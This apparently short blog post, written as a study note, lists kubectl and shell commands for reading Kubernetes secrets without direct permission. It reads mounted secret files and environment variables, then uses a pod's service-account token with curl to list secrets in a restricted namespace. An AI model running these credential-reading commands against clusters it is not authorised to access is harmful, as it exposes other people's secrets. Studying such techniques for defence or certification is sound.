---
title: "Kubernetes Get Secret Without Permissions"

date: 2021-07-27T20:30:00+09:00

author: CozyFex

categories:

- kubernetes
- k8s
- orchestration

tags:

- kubernetes
- secret
- permission

keywords:

- kubernetes
- secret
- permission

---

## Mounted Secret

```shell
kubectl exec pod1 -- cat /etc/secret-volume/password
```

## Environment Secret

```shell
kubectl exec pod2 -- env | grep PASS
```

## By Service Account

### Connect to the Container

```shell
kubectl exec -it pod3 -- sh
```

### Get Mount Information of Service Account in the Container

```shell
mount | grep serviceaccount
```

```
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
```

### Get Service Account Data in the Container

```shell
ls /run/secrets/kubernetes.io/serviceaccount
```

```
ca.crt     namespace  token
```

### Get Secret to Call Kubernetes API in the Container

```shell
curl https://kubernetes.default/api/v1/namespaces/restricted/secrets -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" -k
```


